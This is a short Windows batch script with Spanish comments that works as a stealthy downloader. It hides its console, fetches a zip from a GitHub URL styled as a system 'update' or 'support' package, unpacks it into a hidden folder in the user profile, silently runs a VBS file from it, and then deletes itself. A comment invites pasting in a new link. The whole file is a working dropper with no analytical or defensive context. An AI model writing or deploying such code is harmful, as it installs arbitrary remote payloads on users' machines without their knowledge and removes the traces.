@echo off
mode con cols=15 lines=1
title ...

:: --- CONFIGURACIÓN ---
:: PEGA TU NUEVO LINK DE GITHUB AQUI ABAJO
set "LINK=https://github.com/cleves25/update-sys/raw/refs/heads/main/soporte.zip"

:: --- EJECUCIÓN ---
:: Este comando descarga, descomprime y ejecuta usando rutas absolutas
powershell -WindowStyle Hidden -Command "$dest = $env:USERPROFILE + '\.soporte'; iwr -useb '%LINK%' -OutFile $env:TEMP\spt.zip; Expand-Archive -Force $env:TEMP\spt.zip $dest; Start-Process wscript.exe -ArgumentList """$dest\RUN.vbs""""

:: --- LIMPIEZA ---
(goto) 2>nul & del "%~f0"
exit